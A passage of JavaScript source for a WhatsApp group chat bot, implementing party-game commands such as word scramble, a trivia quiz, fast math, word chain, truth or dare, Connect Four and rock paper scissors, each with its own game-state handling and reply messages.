  if (!global.guessGames.has(sender)) return mzazireply("❌ No Number Guess game is running.");
  const ng = global.guessGames.get(sender);
  global.guessGames.delete(sender);
  mzazireply(`🛑 Game ended. The secret number was *${ng.secret}*.`);
  break;
}

//=====================================//

// ████████████████████████████████████████
//   WORD SCRAMBLE
//   .scramble       — start game
//   .scramble word  — submit answer
//   .endscramble    — stop
// ████████████████████████████████████████
case "scramble":
case "wordscramble": {
  if (!isGroup) return mzazireply("❌ Group only!");

  const scId = sender;

  const scrambleWords = [
    {word:"ELEPHANT",hint:"🐘 Big animal"},
    {word:"CHOCOLATE",hint:"🍫 Sweet treat"},
    {word:"KEYBOARD",hint:"⌨️ Computer part"},
    {word:"FOOTBALL",hint:"⚽ Popular sport"},
    {word:"RAINBOW",hint:"🌈 After rain"},
    {word:"BUTTERFLY",hint:"🦋 Flying insect"},
    {word:"MOUNTAIN",hint:"⛰️ High landform"},
    {word:"INTERNET",hint:"🌐 Global network"},
    {word:"SUNSHINE",hint:"☀️ Warm light"},
    {word:"TREASURE",hint:"💰 Hidden riches"},
    {word:"ADVENTURE",hint:"🗺️ Exciting journey"},
    {word:"CHAMPION",hint:"🏆 Number one winner"},
    {word:"HOSPITAL",hint:"🏥 Medical place"},
    {word:"AIRPLANE",hint:"✈️ Flying vehicle"},
    {word:"DINOSAUR",hint:"🦕 Extinct reptile"},
    {word:"LANGUAGE",hint:"🗣️ Communication system"},
    {word:"UNIVERSE",hint:"🌌 All of space"},
    {word:"CALENDAR",hint:"📅 Tracks dates"},
    {word:"ELEPHANT",hint:"🐘 Never forgets"},
    {word:"SANDWICH",hint:"🥪 Lunch staple"},
    {word:"UMBRELLA",hint:"☂️ Blocks rain"},
    {word:"BIRTHDAY",hint:"🎂 Annual celebration"},
    {word:"DECEMBER",hint:"🎄 Last month"},
    {word:"HOSPITAL",hint:"🏥 For sick people"},
    {word:"COMPUTER",hint:"💻 Digital machine"},
  ];

  const shuffle = (str) => str.split("").sort(() => Math.random() - 0.5).join("");

  // ── Start new game ──
  if (!args[0]) {
    if (global.scrambleGames.has(scId)) return mzazireply(`❌ A Scramble game is already running! Answer with *${prefix}scramble <word>* or stop with *${prefix}endscramble*`);

    const pick = scrambleWords[Math.floor(Math.random() * scrambleWords.length)];
    let scrambled = shuffle(pick.word);
    while (scrambled === pick.word) scrambled = shuffle(pick.word);

    global.scrambleGames.set(scId, {
      word: pick.word,
      scrambled,
      hint: pick.hint,
      startedAt: Date.now(),
      startedBy: msgSender
    });

    return mzazireply(`🎮 *WORD SCRAMBLE!*\n\nUnscramble this word:\n\n🔀 *${scrambled}*\n\n💡 Hint: ${pick.hint}\n📏 Letters: ${pick.word.length}\n\nAnswer: *${prefix}scramble <your answer>*\nStop: *${prefix}endscramble*`);
  }

  // ── Submit answer ──
  const game = global.scrambleGames.get(scId);
  if (!game) return mzazireply(`❌ No active Scramble game. Start one with *${prefix}scramble*`);

  const answer = args.join(" ").toUpperCase().trim();
  if (answer === game.word) {
    global.scrambleGames.delete(scId);
    return mzazi.sendMessage(sender, {
      text: `🎮 *WORD SCRAMBLE*\n\n✅ Correct! The word was *${game.word}*!\n\n🏆 @${jidToNumber(msgSender)} wins! 🎉`,
      mentions: [msgSender]
    }, { quoted: m });
  }

  mzazi.sendMessage(sender, {
    text: `🎮 *WORD SCRAMBLE*\n\n❌ @${jidToNumber(msgSender)} Wrong! Try again.\n\n🔀 Scrambled: *${game.scrambled}*\n💡 Hint: ${game.hint}\n\nAnswer: *${prefix}scramble <your answer>*`,
    mentions: [msgSender]
  }, { quoted: m });
  break;
}

//=====================================//

case "endscramble":
case "stopscramble": {
  if (!isGroup) return mzazireply("❌ Group only!");
  if (!global.scrambleGames.has(sender)) return mzazireply("❌ No Scramble game is running.");
  const sg = global.scrambleGames.get(sender);
  global.scrambleGames.delete(sender);
  mzazireply(`🛑 Scramble ended. The word was *${sg.word}*.`);
  break;
}

//=====================================//

// ████████████████████████████████████████
//   GROUP QUIZ
//   .quiz           — start a question
//   .quiz a/b/c/d   — answer
//   .endquiz        — stop
// ████████████████████████████████████████
case "quiz":
case "groupquiz": {
  if (!isGroup) return mzazireply("❌ Group only!");

  const qzId = sender;

  const questions = [
    {q:"What is the capital of Kenya?",opts:["A. Nairobi","B. Mombasa","C. Kisumu","D. Nakuru"],ans:"A",exp:"Nairobi is the capital of Kenya 🇰🇪"},
    {q:"What is 15 × 15?",opts:["A. 175","B. 200","C. 225","D. 250"],ans:"C",exp:"15 × 15 = 225 ✅"},
    {q:"Which planet is called the Red Planet?",opts:["A. Venus","B. Jupiter","C. Mars","D. Saturn"],ans:"C",exp:"Mars is called the Red Planet 🔴"},
    {q:"What is H2O?",opts:["A. Oxygen","B. Hydrogen","C. Water","D. Salt"],ans:"C",exp:"H2O is the chemical formula for Water 💧"},
    {q:"How many sides does a hexagon have?",opts:["A. 5","B. 6","C. 7","D. 8"],ans:"B",exp:"A hexagon has 6 sides ⬡"},
    {q:"Who wrote Romeo and Juliet?",opts:["A. Charles Dickens","B. William Shakespeare","C. Mark Twain","D. J.K. Rowling"],ans:"B",exp:"Romeo and Juliet was written by William Shakespeare 🎭"},
    {q:"What is the fastest land animal?",opts:["A. Lion","B. Horse","C. Cheetah","D. Tiger"],ans:"C",exp:"The Cheetah is the fastest land animal 🐆"},
    {q:"Which ocean is the largest?",opts:["A. Atlantic","B. Indian","C. Arctic","D. Pacific"],ans:"D",exp:"The Pacific Ocean is the largest 🌊"},
    {q:"What is 100 ÷ 4?",opts:["A. 20","B. 25","C. 30","D. 40"],ans:"B",exp:"100 ÷ 4 = 25 ✅"},
    {q:"What gas do plants absorb during photosynthesis?",opts:["A. Oxygen","B. Nitrogen","C. Carbon Dioxide","D. Hydrogen"],ans:"C",exp:"Plants absorb CO₂ during photosynthesis 🌿"},
    {q:"How many continents are there on Earth?",opts:["A. 5","B. 6","C. 7","D. 8"],ans:"C",exp:"There are 7 continents on Earth 🌍"},
    {q:"What is the largest mammal in the world?",opts:["A. Elephant","B. Giraffe","C. Blue Whale","D. Hippo"],ans:"C",exp:"The Blue Whale is the largest mammal 🐋"},
    {q:"Which country has the most people?",opts:["A. USA","B. India","C. China","D. Brazil"],ans:"B",exp:"India is the most populous country 🇮🇳"},
    {q:"What color is the sun?",opts:["A. Yellow","B. Orange","C. Red","D. White"],ans:"D",exp:"The sun is actually white — it appears yellow due to Earth's atmosphere ☀️"},
    {q:"What is the chemical symbol for Gold?",opts:["A. Go","B. Gd","C. Au","D. Ag"],ans:"C",exp:"Gold's chemical symbol is Au (from Latin Aurum) 🥇"},
    {q:"How many bones are in the adult human body?",opts:["A. 186","B. 206","C. 226","D. 246"],ans:"B",exp:"The adult human body has 206 bones 🦴"},
    {q:"What is the capital of Japan?",opts:["A. Osaka","B. Kyoto","C. Tokyo","D. Hiroshima"],ans:"C",exp:"Tokyo is the capital of Japan 🇯🇵"},
    {q:"Which element has the symbol 'O'?",opts:["A. Gold","B. Osmium","C. Oxygen","D. Oganesson"],ans:"C",exp:"O is the symbol for Oxygen 💨"},
    {q:"What is the smallest planet in our solar system?",opts:["A. Mars","B. Mercury","C. Venus","D. Pluto"],ans:"B",exp:"Mercury is the smallest planet ☿"},
    {q:"In which year did World War 2 end?",opts:["A. 1943","B. 1944","C. 1945","D. 1946"],ans:"C",exp:"World War 2 ended in 1945 🕊️"},
  ];

  // ── Start new quiz ──
  if (!args[0] || args[0].length > 1) {
    if (global.quizGames.has(qzId)) return mzazireply(`❌ A quiz is running! Answer with *${prefix}quiz A/B/C/D* or stop with *${prefix}endquiz*`);

    const q = questions[Math.floor(Math.random() * questions.length)];
    global.quizGames.set(qzId, { ...q, startedAt: Date.now(), startedBy: msgSender, answered: false });

    // Auto-expire after 30 seconds
    setTimeout(() => {
      const gm = global.quizGames.get(qzId);
      if (gm && !gm.answered) {
        global.quizGames.delete(qzId);
        mzazi.sendMessage(qzId, { text: `⏰ *QUIZ EXPIRED!*\n\nNobody answered in time!\nThe answer was: *${gm.ans}* — ${gm.exp}` }).catch(() => {});
      }
    }, 30000);

    return mzazireply(`🎮 *GROUP QUIZ!*\n\n❓ ${q.q}\n\n${q.opts.join("\n")}\n\nAnswer: *${prefix}quiz A/B/C/D*\n⏰ 30 seconds!`);
  }

  // ── Submit answer ──
  const game = global.quizGames.get(qzId);
  if (!game) return mzazireply(`❌ No active quiz. Start one with *${prefix}quiz*`);
  if (game.answered) return;

  const answer = args[0].toUpperCase().trim();
  if (!["A","B","C","D"].includes(answer)) return mzazireply("❌ Answer with A, B, C, or D!");

  game.answered = true;

  if (answer === game.ans) {
    global.quizGames.delete(qzId);
    return mzazi.sendMessage(sender, {
      text: `🎮 *GROUP QUIZ*\n\n✅ *CORRECT!*\n@${jidToNumber(msgSender)} got it right!\n\n💡 ${game.exp}\n\n🏆 Well done!`,
      mentions: [msgSender]
    }, { quoted: m });
  } else {
    game.answered = false; // Allow others to try
    mzazi.sendMessage(sender, {
      text: `🎮 *GROUP QUIZ*\n\n❌ @${jidToNumber(msgSender)} — Wrong! Try again!\n\n❓ ${game.q}\n${game.opts.join("\n")}\n\n⏰ Still running! Others can answer too.`,
      mentions: [msgSender]
    }, { quoted: m });
  }
  break;
}

//=====================================//

case "endquiz":
case "stopquiz": {
  if (!isGroup) return mzazireply("❌ Group only!");
  if (!global.quizGames.has(sender)) return mzazireply("❌ No quiz is running.");
  const qz = global.quizGames.get(sender);
  qz.answered = true;
  global.quizGames.delete(sender);
  mzazireply(`🛑 Quiz ended. The answer was: *${qz.ans}* — ${qz.exp}`);
  break;
}

//=====================================//

// ████████████████████████████████████████
//   FAST MATH CHALLENGE
//   .fastmath      — start a round
//   .fastmath 42   — submit answer
//   .endfastmath   — stop
// ████████████████████████████████████████
case "fastmath":
case "mathchallenge": {
  if (!isGroup) return mzazireply("❌ Group only!");

  const fmId = sender;

  const genQuestion = () => {
    const ops = ["+", "-", "×", "÷"];
    const op = ops[Math.floor(Math.random() * 4)];
    let a, b, ans;
    if (op === "+") { a = Math.floor(Math.random() * 50) + 1; b = Math.floor(Math.random() * 50) + 1; ans = a + b; }
    else if (op === "-") { a = Math.floor(Math.random() * 50) + 20; b = Math.floor(Math.random() * 20) + 1; ans = a - b; }
    else if (op === "×") { a = Math.floor(Math.random() * 12) + 1; b = Math.floor(Math.random() * 12) + 1; ans = a * b; }
    else { b = Math.floor(Math.random() * 10) + 2; ans = Math.floor(Math.random() * 10) + 1; a = b * ans; }
    return { q: `${a} ${op} ${b}`, ans: String(ans) };
  };

  if (!args[0]) {
    if (global.mathGames.has(fmId)) return mzazireply(`❌ A Fast Math game is running! Answer with *${prefix}fastmath <answer>* or stop with *${prefix}endfastmath*`);

    const { q, ans } = genQuestion();
    global.mathGames.set(fmId, { q, ans, startedAt: Date.now(), answered: false });

    setTimeout(() => {
      const gm = global.mathGames.get(fmId);
      if (gm && !gm.answered) {
        global.mathGames.delete(fmId);
        mzazi.sendMessage(fmId, { text: `⏰ *TIME'S UP!*\n\nNobody answered!\nThe answer was *${gm.ans}*` }).catch(() => {});
      }
    }, 20000);

    return mzazireply(`⚡ *FAST MATH CHALLENGE!*\n\n🧮 ${q} = ?\n\nBe the first! Type: *${prefix}fastmath <answer>*\n⏰ 20 seconds!`);
  }

  const game = global.mathGames.get(fmId);
  if (!game) return mzazireply(`❌ No active Fast Math game. Start one with *${prefix}fastmath*`);
  if (game.answered) return;

  const userAns = args[0].trim();
  if (userAns === game.ans) {
    game.answered = true;
    global.mathGames.delete(fmId);
    const timeMs = Date.now() - game.startedAt;
    return mzazi.sendMessage(sender, {
      text: `⚡ *FAST MATH*\n\n🏆 @${jidToNumber(msgSender)} answered first!\n\n🧮 ${game.q} = *${game.ans}* ✅\n⚡ Time: ${(timeMs/1000).toFixed(1)}s`,
      mentions: [msgSender]
    }, { quoted: m });
  }

  mzazi.sendMessage(sender, {
    text: `⚡ *FAST MATH*\n\n❌ @${jidToNumber(msgSender)} — Wrong! Keep trying!\n\n🧮 ${game.q} = ?`,
    mentions: [msgSender]
  }, { quoted: m });
  break;
}

//=====================================//

case "endfastmath":
case "stopmathchallenge": {
  if (!isGroup) return mzazireply("❌ Group only!");
  if (!global.mathGames.has(sender)) return mzazireply("❌ No Fast Math game is running.");
  const fm = global.mathGames.get(sender);
  fm.answered = true;
  global.mathGames.delete(sender);
  mzazireply(`🛑 Fast Math ended. The answer was *${fm.ans}*.`);
  break;
}

//=====================================//

// ████████████████████████████████████████
//   WORD CHAIN
//   .wordchain apple  — start with a word
//   .wc banana        — continue the chain
//   .endwordchain     — stop
// ████████████████████████████████████████
case "wordchain":
case "wc": {
  if (!isGroup) return mzazireply("❌ Group only!");

  const wcId = sender;
  const word = (args[0] || "").toLowerCase().trim().replace(/[^a-z]/g, "");

  if (!word) {
    if (global.wordchainGames.has(wcId)) {
      const wg = global.wordchainGames.get(wcId);
      return mzazireply(`🔗 *WORD CHAIN is active!*\n\nLast word: *${wg.lastWord}*\nWords played: *${wg.chain.length}*\nNext must start with: *${wg.lastWord.slice(-1).toUpperCase()}*\n\nType: *${prefix}wc <word starting with ${wg.lastWord.slice(-1).toUpperCase()}>*`);
    }
    return mzazireply(`🔗 *WORD CHAIN*\n\nStart a word chain!\nType: *${prefix}wc <any word>*\nEach word must start with the last letter of the previous word.\n\nExample:\n• Apple → Elephant → Tomato → …\n\nStop: *${prefix}endwordchain*`);
  }

  if (!global.wordchainGames.has(wcId)) {
    // Start chain
    global.wordchainGames.set(wcId, {
      chain: [word],
      lastWord: word,
      lastPlayer: msgSender,
      usedWords: new Set([word]),
      startedAt: Date.now()
    });
    const nextLetter = word.slice(-1).toUpperCase();
    return mzazireply(`🔗 *WORD CHAIN STARTED!*\n\nFirst word: *${word.toUpperCase()}*\nNext word must start with: *${nextLetter}*\n\nType: *${prefix}wc <word starting with ${nextLetter}>*\nStop: *${prefix}endwordchain*`);
  }

  const game = global.wordchainGames.get(wcId);
  const lastLetter = game.lastWord.slice(-1);

  if (!word.startsWith(lastLetter)) {
    return mzazi.sendMessage(sender, {
      text: `🔗 *WORD CHAIN*\n\n❌ @${jidToNumber(msgSender)} — *${word.toUpperCase()}* doesn't start with *${lastLetter.toUpperCase()}*!\n\nLast word was: *${game.lastWord.toUpperCase()}*`,
      mentions: [msgSender]
    }, { quoted: m });
  }

  if (game.usedWords.has(word)) {
    return mzazi.sendMessage(sender, {
      text: `🔗 *WORD CHAIN*\n\n❌ @${jidToNumber(msgSender)} — *${word.toUpperCase()}* was already used! Try another.`,
      mentions: [msgSender]
    }, { quoted: m });
  }

  game.chain.push(word);
  game.usedWords.add(word);
  game.lastWord = word;
  game.lastPlayer = msgSender;

  const nextLetter = word.slice(-1).toUpperCase();
  mzazi.sendMessage(sender, {
    text: `🔗 *WORD CHAIN*\n\n✅ @${jidToNumber(msgSender)}: *${word.toUpperCase()}*\n\nChain length: *${game.chain.length}*\nNext must start with: *${nextLetter}*`,
    mentions: [msgSender]
  }, { quoted: m });
  break;
}

//=====================================//

case "endwordchain":
case "stopwc": {
  if (!isGroup) return mzazireply("❌ Group only!");
  if (!global.wordchainGames.has(sender)) return mzazireply("❌ No Word Chain game is running.");
  const wg = global.wordchainGames.get(sender);
  global.wordchainGames.delete(sender);
  mzazireply(`🛑 Word Chain ended!\n\n🔗 Chain: ${wg.chain.map(w => w.toUpperCase()).join(" → ")}\n📊 Total words: *${wg.chain.length}*`);
  break;
}

//=====================================//

// ████████████████████████████████████████
//   GROUP TRUTH OR DARE SPIN
//   .todstart        — start a session
//   .tod             — spin for a participant
//   .todstop         — end session
// ████████████████████████████████████████
case "tod":
case "truthordare":
case "todgame": {
  if (!isGroup) return mzazireply("❌ Group only!");

  const todId = sender;
  const todGame = global.truthDareGames.get(todId) || null;

  const truths = [
    "What's the most embarrassing thing that's ever happened to you?",
    "Have you ever lied to get out of trouble? What was it?",
    "What is your biggest fear?",
    "Have you ever cheated on a test?",
    "What's the weirdest dream you've ever had?",
    "Who in this group do you think is the funniest?",
    "What's a secret you've never told anyone?",
    "Have you ever pretended to be sick to avoid something?",
    "What is your most embarrassing nickname?",
    "Who was your first crush?",
    "Have you ever stolen anything, even something small?",
    "What's the worst gift you've ever received?",
    "Have you ever laughed so hard you cried in public?",
    "What's the pettiest reason you've been upset?",
    "What's the last lie you told?",
  ];

  const dares = [
    "Send a voice note saying 'I am the king/queen of this group' dramatically!",
    "Type your full name using only emojis.",
    "Change your profile photo to an ugly selfie for 1 hour.",
    "Write a short poem about the group right now.",
    "Speak only in CAPS for the next 5 minutes.",
    "Add a random contact from your phone to this group.",
    "Type the ABCs backwards as fast as you can.",
    "Send a 'I miss you' message to the 3rd person in your contacts.",
    "Do a handstand and send a photo.",
    "Describe yourself in exactly 10 words.",
    "Call someone random from your contacts and say 'the eagle has landed'.",
    "Send the last photo in your gallery (if appropriate).",
    "Type without using the letter 'e' for your next 3 messages.",
    "Text your mum/mum figure 'I got a tattoo today' and screenshot the reply.",
    "Reveal the last YouTube video you watched.",
  ];

  if (!participants || participants.length < 2) return mzazireply("❌ Not enough members for this game.");

  const validMembers = participants.filter(p => {
    const jid = normalizeJid(p.id);
    return jid && jid !== botJid;
  });

  if (validMembers.length < 2) return mzazireply("❌ Not enough members to pick from.");

  const randomMember = validMembers[Math.floor(Math.random() * validMembers.length)];
  const pickedJid = normalizeJid(randomMember.id);
  const isT = Math.random() < 0.5;
  const selected = isT
    ? truths[Math.floor(Math.random() * truths.length)]
    : dares[Math.floor(Math.random() * dares.length)];

  mzazi.sendMessage(sender, {
    text: `🎰 *TRUTH OR DARE!*\n\n🎯 The wheel spun and landed on:\n👉 @${jidToNumber(pickedJid)}\n\n${isT ? "🤔 *TRUTH:*" : "💪 *DARE:*"}\n\n${selected}\n\n_@${jidToNumber(pickedJid)} you must respond!_`,
    mentions: [pickedJid]
  }, { quoted: m });
  break;
}

//=====================================//

// ████████████████████████████████████████
//   GROUP WOULD YOU RATHER (GROUP VOTE)
//   .wyr              — get a question
// ████████████████████████████████████████
case "wyr":
case "wouldyrather":
case "wyrvote": {
  if (!isGroup) return mzazireply("❌ Group only!");

  const wyrQuestions = [
    ["Be invisible for a day","Be able to fly for a day"],
    ["Never use social media again","Never watch TV/movies again"],
    ["Have unlimited money but no friends","Have great friends but always be broke"],
    ["Live in the past","Live in the future"],
    ["Be super strong","Be super smart"],
    ["Always know when people are lying","Always get away with lying"],
    ["Be famous but hated","Unknown but loved"],
    ["Only eat your favourite food forever","Never eat it again"],
    ["Lose all your memories from birth to now","Lose all your memories from now on"],
    ["Speak every language","Play every instrument"],
    ["Have 10 siblings","Be an only child"],
    ["Be the funniest person in any room","Be the most attractive person in any room"],
    ["Never be able to use the internet again","Never be able to eat your favourite food again"],
    ["Have a rewind button for your life","Have a pause button for your life"],
    ["Know how you die","Know when you will die"],
  ];

  const q = wyrQuestions[Math.floor(Math.random() * wyrQuestions.length)];
  mzazi.sendMessage(sender, {
    text: `🤔 *WOULD YOU RATHER?*\n\n🅰️ *${q[0]}*\n\n— OR —\n\n🅱️ *${q[1]}*\n\nVote: Reply with *A* or *B* 🗳️`,
  }, { quoted: m });
  break;
}

//=====================================//

// ████████████████████████████████████████
//   CONNECT FOUR
//   .c4 @user         — challenge
//   .c4 1-7           — drop a piece
//   .endc4            — forfeit
// ████████████████████████████████████████
case "c4":
case "connect4": {
  if (!isGroup) return mzazireply("❌ Group only!");

  const c4Id = sender;
  const ROWS = 6, COLS = 7;

  const emptyBoard = () => Array.from({ length: ROWS }, () => Array(COLS).fill(0));

  const renderBoard = (board) => {
    const symbols = ["⬜", "🔴", "🟡"];
    const colNums = "1️⃣2️⃣3️⃣4️⃣5️⃣6️⃣7️⃣";
    let str = colNums + "\n";
    for (let r = 0; r < ROWS; r++) {
      str += board[r].map(c => symbols[c]).join("") + "\n";
    }
    return str;
  };

  const checkWin = (board, player) => {
    // Horizontal
    for (let r = 0; r < ROWS; r++)
      for (let c = 0; c <= COLS - 4; c++)
        if ([0,1,2,3].every(i => board[r][c+i] === player)) return true;
    // Vertical
    for (let r = 0; r <= ROWS - 4; r++)
      for (let c = 0; c < COLS; c++)
        if ([0,1,2,3].every(i => board[r+i][c] === player)) return true;
    // Diagonal ↘
    for (let r = 0; r <= ROWS - 4; r++)
      for (let c = 0; c <= COLS - 4; c++)
        if ([0,1,2,3].every(i => board[r+i][c+i] === player)) return true;
    // Diagonal ↙
    for (let r = 0; r <= ROWS - 4; r++)
      for (let c = 3; c < COLS; c++)
        if ([0,1,2,3].every(i => board[r+i][c-i] === player)) return true;
    return false;
  };

  const dropPiece = (board, col, player) => {
    for (let r = ROWS - 1; r >= 0; r--) {
      if (board[r][col] === 0) { board[r][col] = player; return true; }
    }
    return false; // column full
  };

  // ── Challenge ──
  const mentioned = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
  if (mentioned.length > 0 && !parseInt(args[0])) {
    if (global.connectGames.has(c4Id)) return mzazireply("❌ A Connect 4 game is already running! Use *endc4* to stop it.");
    const opp = mentioned[0];
    if (opp === msgSender) return mzazireply("❌ You can't challenge yourself!");

    const board = emptyBoard();
    global.connectGames.set(c4Id, {
      board,
      players: [msgSender, opp],
      symbols: ["🔴", "🟡"],
      turn: 0,
      startedAt: Date.now()
    });

    return mzazi.sendMessage(sender, {
      text: `🎮 *CONNECT FOUR!*\n\n🔴 @${jidToNumber(msgSender)} vs 🟡 @${jidToNumber(opp)}\n\n${renderBoard(board)}\n\n🔴 @${jidToNumber(msgSender)}'s turn!\nType *${prefix}c4 <1-7>* to drop a piece.`,
      mentions: [msgSender, opp]
    }, { quoted: m });
  }

  // ── Make a move ──
  const game = global.connectGames.get(c4Id);
  if (!game) return mzazireply(`❌ No Connect 4 game running. Start one with *${prefix}c4 @player*`);

  const col = parseInt(args[0]) - 1;
  if (isNaN(col) || col < 0 || col > 6) return mzazireply("❌ Choose a column between 1 and 7.");

  const currentPlayer = game.players[game.turn % 2];
  if (msgSender !== currentPlayer) return mzazireply("⏳ It's not your turn!");

  const pieceNum = (game.turn % 2) + 1;
  const dropped = dropPiece(game.board, col, pieceNum);
  if (!dropped) return mzazireply("❌ That column is full! Choose another.");

  game.turn++;
  const boardStr = renderBoard(game.board);

  if (checkWin(game.board, pieceNum)) {
    global.connectGames.delete(c4Id);
    return mzazi.sendMessage(sender, {
      text: `🎮 *CONNECT FOUR*\n\n${boardStr}\n\n🏆 @${jidToNumber(currentPlayer)} WINS! 🎉`,
      mentions: [currentPlayer]
    }, { quoted: m });
  }

  const isFull = game.board[0].every(c => c !== 0);
  if (isFull) {
    global.connectGames.delete(c4Id);
    return mzazireply(`🎮 *CONNECT FOUR*\n\n${boardStr}\n\n🤝 It's a DRAW!`);
  }

  const nextPlayer = game.players[game.turn % 2];
  const nextSym = game.symbols[game.turn % 2];
  mzazi.sendMessage(sender, {
    text: `🎮 *CONNECT FOUR*\n\n${boardStr}\n\n${nextSym} @${jidToNumber(nextPlayer)}'s turn! Type *${prefix}c4 <1-7>*`,
    mentions: [nextPlayer]
  }, { quoted: m });
  break;
}

//=====================================//

case "endc4":
case "stopconnect4": {
  if (!isGroup) return mzazireply("❌ Group only!");
  if (!global.connectGames.has(sender)) return mzazireply("❌ No Connect 4 game is running.");
  global.connectGames.delete(sender);
  mzazireply("🛑 Connect 4 game ended.");
  break;
}

//=====================================//

// ████████████████████████████████████████
//   RPS (ROCK PAPER SCISSORS) — 1v1
//   .rps1v1 @user   — challenge
//   .rps rock/paper/scissors — play
//   .endrps         — stop
// ████████████████████████████████████████
case "rps1v1":
case "rps2": {
  if (!isGroup) return mzazireply("❌ Group only!");

  const rpsId = sender;
  const mentioned = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];

  const rpsEmojis = { rock: "🪨", paper: "📄", scissors: "✂️" };
  const rpsWins = { rock: "scissors", paper: "rock", scissors: "paper" };

  if (mentioned.length > 0) {
    if (global.rpsGames.has(rpsId)) return mzazireply("❌ A RPS game is already running! Use *endrps* to stop.");
    const opp = mentioned[0];
    if (opp === msgSender) return mzazireply("❌ You can't challenge yourself!");

    global.rpsGames.set(rpsId, {
      players: [msgSender, opp],
      choices: {},
      startedAt: Date.now()
    });

    return mzazi.sendMessage(sender, {
      text: `🎮 *ROCK PAPER SCISSORS — 1v1!*\n\n@${jidToNumber(msgSender)} vs @${jidToNumber(opp)}\n\nBoth players type:\n*${prefix}rps rock* | *${prefix}rps paper* | *${prefix}rps scissors*\n\n(Your choice is visible only after both pick!)`,
      mentions: [msgSender, opp]
    }, { quoted: m });
  }

  const game = global.rpsGames.get(rpsId);
  if (!game) return mzazireply(`❌ No RPS game. Challenge someone: *${prefix}rps1v1 @user*`);

  const choice = args[0]?.toLowerCase();
  if (!["rock", "paper", "scissors"].includes(choice)) return mzazireply("❌ Choose *rock*, *paper*, or *scissors*.");
  if (!game.players.includes(msgSender)) return mzazireply("❌ You're not in this game.");
  if (game.choices[msgSender]) return mzazireply("✅ You already chose! Wait for your opponent.");

  game.choices[msgSender] = choice;

  if (Object.keys(game.choices).length < 2) {
    return mzazi.sendMessage(sender, {
      text: `✅ @${jidToNumber(msgSender)} has chosen! Waiting for the other player...`,
      mentions: [msgSender]
    }, { quoted: m });
  }

  // Both chose — reveal
  const [p1, p2] = game.players;
  const c1 = game.choices[p1], c2 = game.choices[p2];
  global.rpsGames.delete(rpsId);

  let result;
  if (c1 === c2) result = `🤝 *DRAW!* Both chose ${rpsEmojis[c1]} ${c1}!`;
  else if (rpsWins[c1] === c2) result = `🏆 @${jidToNumber(p1)} WINS!\n${rpsEmojis[c1]} ${c1} beats ${rpsEmojis[c2]} ${c2}!`;
  else result = `🏆 @${jidToNumber(p2)} WINS!\n${rpsEmojis[c2]} ${c2} beats ${rpsEmojis[c1]} ${c1}!`;

  mzazi.sendMessage(sender, {
    text: `🎮 *ROCK PAPER SCISSORS — RESULT!*\n\n@${jidToNumber(p1)}: ${rpsEmojis[c1]} *${c1}*\n@${jidToNumber(p2)}: ${rpsEmojis[c2]} *${c2}*\n\n${result}`,
    mentions: [p1, p2]
  }, { quoted: m });
  break;
}

//=====================================//

case "endrps":
case "stoprps": {
  if (!isGroup) return mzazireply("❌ Group only!");
  if (!global.rpsGames.has(sender)) return mzazireply("❌ No RPS game is running.");
  global.rpsGames.delete(sender);
  mzazireply("🛑 RPS game ended.");
  break;
}

//=====================================//

// ████████████████████████████████████████
//   NEVER HAVE I EVER (GROUP)
//   .nhie2           — get a statement
// ████████████████████████████████████████
case "nhie2":
case "neverhaveiever2": {
  if (!isGroup) return mzazireply("❌ Group only!");

  const nhieStatements = [
    "Never have I ever lied to get out of trouble.",
    "Never have I ever eaten food off the floor.",
    "Never have I ever fallen asleep in class.",
    "Never have I ever sent a message to the wrong person.",
    "Never have I ever skipped school.",
    "Never have I ever pretended to laugh at a joke I didn't understand.",
    "Never have I ever walked into a glass door.",
    "Never have I ever forgotten someone's name immediately after being introduced.",
    "Never have I ever googled myself.",
    "Never have I ever stayed up all night.",
    "Never have I ever cried during a movie.",
    "Never have I ever taken food from someone else's plate without asking.",
    "Never have I ever blocked someone on social media.",
    "Never have I ever talked to myself out loud in public.",
    "Never have I ever started watching a series and given up halfway.",
  ];

  const s = nhieStatements[Math.floor(Math.random() * nhieStatements.length)];
  mzazireply(`🙋 *NEVER HAVE I EVER!*\n\n🗣️ _${s}_\n\nReact with:\n👍 — I HAVE done this\n👎 — I've NEVER done this\n\n_Be honest!_ 😂`);
  break;
}

//=====================================//

// ████████████████████████████████████████
//   FILL IN THE BLANK
//   .fillblank       — get a question
// ████████████████████████████████████████
case "fillblank":
case "fillintheblanks": {
  if (!isGroup) return mzazireply("❌ Group only!");

  const blanks = [
    {q:"The capital of France is ___.",ans:"Paris"},
    {q:"Water boils at ___ degrees Celsius.",ans:"100"},
    {q:"The Sun is a ___.",ans:"Star"},
    {q:"___ is the fastest land animal.",ans:"Cheetah"},
    {q:"The Great Wall is located in ___.",ans:"China"},
    {q:"The chemical symbol for water is ___.",ans:"H2O"},
    {q:"The currency of the United States is the ___.",ans:"Dollar"},
    {q:"___ wrote the play 'Hamlet'.",ans:"Shakespeare"},
    {q:"A triangle has ___ sides.",ans:"3"},
    {q:"The Amazon River is in ___ America.",ans:"South"},
    {q:"The human body has ___ bones.",ans:"206"},
    {q:"Light travels at ___ km/s (approximately).",ans:"300,000"},
    {q:"The tallest mountain in the world is ___ .",ans:"Mount Everest"},
    {q:"The largest ocean on Earth is the ___ Ocean.",ans:"Pacific"},
    {q:"___ is the powerhouse of the cell.",ans:"Mitochondria"},
  ];

  const pick = blanks[Math.floor(Math.random() * blanks.length)];
  mzazireply(`✍️ *FILL IN THE BLANK!*\n\n❓ ${pick.q}\n\nType your answer!\n||Answer: ${pick.ans}||`);
  break;
}

//=====================================//

// ████████████████████████████████████████
//   RANDOM GROUP CHALLENGE
//   .challenge       — get a group challenge
// ████████████████████████████████████████
case "challenge":
case "groupchallenge": {
  if (!isGroup) return mzazireply("❌ Group only!");

  const challenges = [
    "🎯 Everyone in the group must send a voice note saying their name in a funny voice!",
    "📸 First person to send a selfie with a thumbs up wins bragging rights!",
    "🧠 First person to answer: What is 999 + 111 - 555 + 222?",
    "🏃 Challenge: Do 10 jumping jacks and type 'DONE' when finished!",
    "🎤 Everyone must send a 5-second voice note singing any song!",
    "✍️ Who can type the alphabet backwards the fastest?",
    "😂 Send the funniest meme you have saved RIGHT NOW!",
    "🌍 Name 5 African countries starting with letters A-E!",
    "🔢 Count from 1 to 50 using only emojis!",
    "🎭 Everyone must react to the last message with a different emoji!",
    "🤸 Send a photo of you doing something physical right now!",
    "📖 Type a 3-sentence story using only the letters A, E, I, O, U!",
